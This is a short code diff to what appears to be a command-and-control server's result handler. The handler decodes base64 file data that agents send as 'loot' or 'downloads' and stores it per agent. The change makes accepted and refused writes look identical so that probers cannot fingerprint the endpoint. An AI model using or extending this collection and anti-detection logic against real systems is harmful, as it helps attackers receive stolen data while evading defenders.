@@ -2105,18 +2105,28 @@ def _handle_result(payload: dict, crypto: ServerCrypto, data_dir: Path):
     if data and data.get("data"):
         is_loot = data.get("loot", False)
         sub = "loot" if is_loot else "downloads"
-        # A refused write is answered exactly like an accepted one: this
-        # route must not let a prober tell the two apart.
-        dl_dir = _agent_file_dir(data_dir, sub, agent_id)
-        if dl_dir is None:
-            logger.warning("Refused %s write for unknown or unsafe agent %r",
+        # Every outcome below, written or refused, falls through to the same
+        # ack: this route must not let a prober tell them apart. The payload
+        # is decoded before the registry is consulted so that undecodable
+        # data fails identically for a known and an unknown agent.
+        try:
+            content = base64.b64decode(data["data"])
+        except (ValueError, TypeError):
+            content = None
+            logger.warning("Refused %s write from %r: data is not base64",
                            sub, agent_id)
-        else:
+        dl_dir = None
+        if content is not None:
+            dl_dir = _agent_file_dir(data_dir, sub, agent_id)
+            if dl_dir is None:
+                logger.warning("Refused %s write for unknown or unsafe "
+                               "agent %r", sub, agent_id)
+        if dl_dir is not None:
             dl_dir.mkdir(parents=True, exist_ok=True)
             filename = _flat_filename(data.get("filename") or f"{task_id}.bin")
             ts = time.strftime("%Y%m%d-%H%M%S")
             stored_name = f"{ts}_{filename}"
-            (dl_dir / stored_name).write_bytes(base64.b64decode(data["data"]))
+            (dl_dir / stored_name).write_bytes(content)
             logger.info("%s saved: %s/%s", sub.title(), agent_id, stored_name)
             category = "LOOT" if is_loot else "DOWNLOAD"
             _log_event(category,
